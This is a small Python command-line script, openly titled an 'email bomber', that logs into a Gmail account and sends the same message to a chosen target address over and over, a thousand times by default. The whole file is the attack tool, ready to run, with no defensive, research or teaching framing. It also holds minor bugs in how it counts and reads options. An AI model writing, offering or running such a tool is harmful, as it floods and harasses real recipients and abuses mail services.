#!/usr/bin/env python
import smtplib
import argparse


def sendMail(sender, password, reciver, subject, msg, times):
    header = 'From :{}\n'.format(sender)
    header += 'To :{}\n'.format(reciver)
    header += 'Subject :{}\n'.format(subject)
    message = header + msg
    try:
        for n in range(1, times):  # Or you can use from "while true" loop
            server = smtplib.SMTP(host='smtp.gmail.com', port=587)
            server.starttls()
            server.login(sender, password)
            server.sendmail(from_addr=sender, to_addrs=reciver, msg=message)
            server.quit()
            print('{} email sent'.format(n))
    except:
        print('Failed to send email!!!')


def main():
    # Argument setup
    parser = argparse.ArgumentParser(description="Email bomber")
    parser.add_argument("-f", "--sender", type=str, help="Email address for mail to be sent from ONLY SUPPORTS GMAIL")
    parser.add_argument("-p", "--passwd", type=str, help="Password for the sender email account")
    parser.add_argument("-t", "--to", type=str, help="Target email")
    parser.add_argument("-s", "--subject", type=str, help="Subject of email")
    parser.add_argument("-m", "--message", type=str, help="Message body")
    parser.add_argument("-n", "--times", type=int, help="Times to send the email")
    args = parser.parse_args()

    # Send the emails
    if not args.sender or not args.passwd or not args.to:
        print("Fields not specified")
        exit()
    else:
        subject = "Email Bomb"
        msg = "From the python email bomber with <3"
        times = 1000
        if args.subject:
            subject = args.subject
        elif args.message:
            msg = args.message
        elif args.times:
            times = args.times
        sendMail(args.sender, args.passwd, args.to, subject, msg, times)


if __name__ == "__main__":
    main()
